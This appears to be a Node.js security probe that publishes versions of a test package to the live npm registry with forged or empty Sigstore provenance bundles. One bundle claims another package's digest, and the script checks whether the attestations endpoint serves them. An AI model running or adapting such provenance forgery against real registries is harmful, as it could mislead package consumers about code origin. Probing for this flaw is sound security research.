#!/usr/bin/env node
// Sigstore-attachment injection probes — the *correct* shape.
//
// Per npm/cli @ b1965d6 in workspaces/libnpmpublish/lib/publish.js (lines 104, 160-164):
// when --provenance is used, the CLI attaches the Sigstore bundle to _attachments under
// the key `<pkg>-<version>.sigstore`. The bundle contains an in-toto SLSA attestation
// signed by Fulcio + logged in Rekor.
//
// Question: if a publisher (using a granular token, no OIDC) submits a .sigstore
// attachment with arbitrary bytes, does the registry:
//   (1) reject the publish?
//   (2) accept and serve the bundle at /-/npm/v1/attestations/<pkg>@<version>?
//   (3) verify cryptographically (Fulcio chain + Rekor inclusion) and reject invalid?
//
// Probes:
//   A — fake but Sigstore-bundle-shaped attachment (real-looking JSON, fake sig)
//   B — empty .sigstore attachment (zero-length)
//   C — well-formed in-toto subject claiming SOMEONE ELSE's tarball digest

import crypto from 'node:crypto'
import fs from 'node:fs'
import os from 'node:os'
import path from 'node:path'
import { execSync } from 'node:child_process'

const REGISTRY = 'https://registry.npmjs.org'
const PKG = 'ghostpublish'
const TS = Math.floor(Date.now() / 1000)

function readToken() {
  for (const p of [path.resolve('.npmrc'), path.join(os.homedir(), '.npmrc')]) {
    try {
      const text = fs.readFileSync(p, 'utf8')
      const m = text.match(/_authToken=([A-Za-z0-9_-]+)/)
      if (m) return m[1].trim()
    } catch {}
  }
  throw new Error('No npm auth token found')
}
const token = readToken()

function buildTarball(version) {
  const stagingDir = fs.mkdtempSync(path.join(os.tmpdir(), 'gh-sigatt-'))
  const pkgDir = path.join(stagingDir, 'package')
  fs.mkdirSync(pkgDir)
  fs.writeFileSync(path.join(pkgDir, 'package.json'),
    JSON.stringify({ name: PKG, version, license: 'MIT', main: 'index.js' }, null, 2))
  fs.writeFileSync(path.join(pkgDir, 'index.js'), `module.exports = { ts: ${TS} };\n`)
  const tarballPath = path.join(stagingDir, `${PKG}-${version}.tgz`)
  execSync(`tar --no-xattrs --format=ustar -czf "${tarballPath}" -C "${stagingDir}" package`, { stdio: 'inherit' })
  const buf = fs.readFileSync(tarballPath)
  return {
    buf,
    sha1: crypto.createHash('sha1').update(buf).digest('hex'),
    sha512Hex: crypto.createHash('sha512').update(buf).digest('hex'),
    integrity: `sha512-${crypto.createHash('sha512').update(buf).digest('base64')}`,
  }
}

function buildFakeSigstoreBundle({ subjectName, subjectSha512Hex }) {
  // Construct an in-toto v1 statement
  const statement = {
    _type: 'https://in-toto.io/Statement/v1',
    subject: [{
      name: subjectName,
      digest: { sha512: subjectSha512Hex },
    }],
    predicateType: 'https://slsa.dev/provenance/v1',
    predicate: {
      buildDefinition: {
        buildType: 'PROBE_FAKE_https://slsa-framework.github.io/github-actions-buildtypes/workflow/v1',
        externalParameters: { workflow: { ref: 'PROBE_FAKE_REF', repository: 'PROBE_FAKE_REPO', path: 'PROBE_FAKE_PATH' } },
      },
      runDetails: {
        builder: { id: 'PROBE_FAKE_BUILDER_ID' },
        metadata: { invocationId: 'PROBE_FAKE_INVOCATION' },
      },
    },
  }
  const payload = Buffer.from(JSON.stringify(statement)).toString('base64')

  // Sigstore bundle envelope (well-formed shape, fake content)
  return {
    mediaType: 'application/vnd.dev.sigstore.bundle.v0.3+json',
    verificationMaterial: {
      certificate: {
        rawBytes: 'PROBE_FAKE_CERT_AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA=',
      },
      tlogEntries: [{
        logIndex: '999999999',
        logId: { keyId: 'PROBE_FAKE_LOG_ID_AAAAAAAA' },
        kindVersion: { kind: 'intoto', version: '0.0.2' },
        integratedTime: '0',
        inclusionPromise: { signedEntryTimestamp: 'PROBE_FAKE_SET_AAAAAAAA' },
        canonicalizedBody: 'PROBE_FAKE_BODY_AAAAAAAA=',
      }],
    },
    dsseEnvelope: {
      payload,
      payloadType: 'application/vnd.in-toto+json',
      signatures: [{ keyid: '', sig: 'PROBE_FAKE_SIG_AAAAAAAAAAAA=' }],
    },
  }
}

async function publishWithSigstoreAttachment(version, sigstoreBytes) {
  const { buf, sha1, integrity } = buildTarball(version)
  const tgzName = `${PKG}-${version}.tgz`
  const sigName = `${PKG}-${version}.sigstore`
  const body = {
    _id: PKG, name: PKG, description: 'sigstore attachment probe',
    'dist-tags': { 'sigatt-probe': version },
    versions: {
      [version]: {
        name: PKG, version, license: 'MIT', main: 'index.js', _id: `${PKG}@${version}`,
        dist: { tarball: `${REGISTRY}/${PKG}/-/${tgzName}`, shasum: sha1, integrity },
      },
    },
    _attachments: {
      [tgzName]: { content_type: 'application/octet-stream', data: buf.toString('base64'), length: buf.length },
      [sigName]: { content_type: 'application/vnd.dev.sigstore.bundle.v0.3+json', data: sigstoreBytes.toString('base64'), length: sigstoreBytes.length },
    },
  }
  const t0 = Date.now()
  const res = await fetch(`${REGISTRY}/${PKG}`, {
    method: 'PUT',
    headers: { authorization: `Bearer ${token}`, 'content-type': 'application/json', accept: '*/*' },
    body: JSON.stringify(body),
  })
  const text = await res.text()
  return { version, res, text, elapsed: Date.now() - t0, real: { sha1, integrity, sha512Hex: crypto.createHash('sha512').update(buf).digest('hex') } }
}

async function readManifest(version) {
  const r = await fetch(`${REGISTRY}/${PKG}/${version}`, { headers: { accept: 'application/json' } })
  if (!r.ok) return { ok: false, status: r.status, body: await r.text() }
  return { ok: true, manifest: await r.json() }
}

async function readAttestations(version) {
  const u = `${REGISTRY}/-/npm/v1/attestations/${PKG}@${version}`
  const r = await fetch(u, { headers: { accept: 'application/json' } })
  return { url: u, status: r.status, body: r.ok ? await r.json() : await r.text() }
}

const REPORT = []
function record(probe, sentSummary, attestStatus, verdict, putStatus) {
  REPORT.push({ probe, sentSummary, attestStatus, verdict, putStatus })
}
function logHeader(t) { console.log('\n' + '='.repeat(72) + '\n' + t + '\n' + '='.repeat(72)) }
function sleep(ms) { return new Promise((r) => setTimeout(r, ms)) }

// ---- Probe A: fake Sigstore-bundle-shaped attachment ----
{
  logHeader('PROBE A — fake .sigstore attachment with own tarball as subject')
  const version = `1.0.0-sigatt-fake-${TS}`
  const realDigest = crypto.createHash('sha512').update(`probe-${version}`).digest('hex') // placeholder; we replace below
  const tarballForReal = buildTarball(version)
  const fakeBundle = buildFakeSigstoreBundle({
    subjectName: `pkg:npm/${PKG}@${version}`,
    subjectSha512Hex: tarballForReal.sha512Hex,
  })
  const out = await publishWithSigstoreAttachment(version, Buffer.from(JSON.stringify(fakeBundle)))
  console.log(`PUT HTTP ${out.res.status} (${out.elapsed} ms): ${out.text.slice(0, 300)}`)
  await sleep(2500)
  const att = await readAttestations(version)
  console.log(`  attestations endpoint: ${att.status}`)
  if (typeof att.body === 'object') console.log(`  body keys: ${Object.keys(att.body).join(', ')}`)
  if (typeof att.body === 'string') console.log(`  body preview: ${att.body.slice(0, 200)}`)
  let verdict
  if (out.res.status !== 200) {
    verdict = `PUT REJECTED ${out.res.status}: ${out.text.slice(0, 100)}`
  } else if (att.status === 404) {
    verdict = '*** PUT 200 but attestation NOT registered — registry stripped/ignored the .sigstore attachment ***'
  } else if (att.status === 200 && JSON.stringify(att.body).includes('PROBE_FAKE')) {
    verdict = '*** CRITICAL — fake Sigstore bundle accepted and served by attestations endpoint ***'
  } else {
    verdict = `attestations endpoint: ${att.status}; body has no PROBE_FAKE markers`
  }
  record('fake .sigstore attachment', '<fake bundle, own subject>', `${att.status}`, verdict, out.res.status)
}

// ---- Probe B: empty .sigstore attachment ----
{
  logHeader('PROBE B — empty .sigstore attachment')
  const version = `1.0.0-sigatt-empty-${TS}`
  const out = await publishWithSigstoreAttachment(version, Buffer.alloc(0))
  console.log(`PUT HTTP ${out.res.status} (${out.elapsed} ms): ${out.text.slice(0, 300)}`)
  await sleep(2500)
  const att = await readAttestations(version)
  console.log(`  attestations endpoint: ${att.status}`)
  let verdict = out.res.status !== 200 ? `PUT REJECTED ${out.res.status}: ${out.text.slice(0, 100)}`
    : att.status === 404 ? 'PUT 200, attestation 404 (empty bundle ignored)'
    : att.status === 200 ? '*** empty attestation served? ***'
    : `attestations: ${att.status}`
  record('empty .sigstore attachment', '<zero bytes>', `${att.status}`, verdict, out.res.status)
}

// ---- Probe C: subject digest claims a different tarball ----
{
  logHeader('PROBE C — well-formed .sigstore but subject digest is for SOMEONE ELSE')
  const version = `1.0.0-sigatt-wrongsubj-${TS}`
  // Use a canonical real digest from a different package to make the probe interesting
  // (e.g., a digest that would pass cryptographic verification IF the registry only checked
  // the Fulcio chain and not the subject-vs-tarball binding).
  const someoneElsesDigest = '0'.repeat(128)
  const fakeBundle = buildFakeSigstoreBundle({
    subjectName: 'pkg:npm/some-other-package@1.0.0',
    subjectSha512Hex: someoneElsesDigest,
  })
  const out = await publishWithSigstoreAttachment(version, Buffer.from(JSON.stringify(fakeBundle)))
  console.log(`PUT HTTP ${out.res.status} (${out.elapsed} ms): ${out.text.slice(0, 300)}`)
  await sleep(2500)
  const att = await readAttestations(version)
  console.log(`  attestations endpoint: ${att.status}`)
  let verdict
  if (out.res.status !== 200) {
    verdict = `PUT REJECTED ${out.res.status}: ${out.text.slice(0, 100)}`
  } else if (att.status === 404) {
    verdict = 'PUT 200, attestation 404 (mismatched subject ignored)'
  } else if (att.status === 200) {
    verdict = '*** CRITICAL — wrong-subject bundle accepted ***'
  } else {
    verdict = `attestations: ${att.status}`
  }
  record('mismatched subject .sigstore', `subject=other-pkg, digest=${someoneElsesDigest.slice(0, 16)}...`, `${att.status}`, verdict, out.res.status)
}

// ---- Summary ----
logHeader('SUMMARY')
console.log()
console.log('| Probe                                  | PUT  | Attest | Verdict |')
console.log('|----------------------------------------|------|--------|---------|')
for (const r of REPORT) {
  console.log(`| ${r.probe.padEnd(38)} | ${String(r.putStatus).padEnd(4)} | ${String(r.attestStatus).padEnd(6)} | ${r.verdict} |`)
}
console.log()
console.log('Detail:')
for (const r of REPORT) {
  console.log(`  [${r.probe}]`)
  console.log(`    sent:   ${r.sentSummary}`)
  console.log(`    verdict: ${r.verdict}`)
}
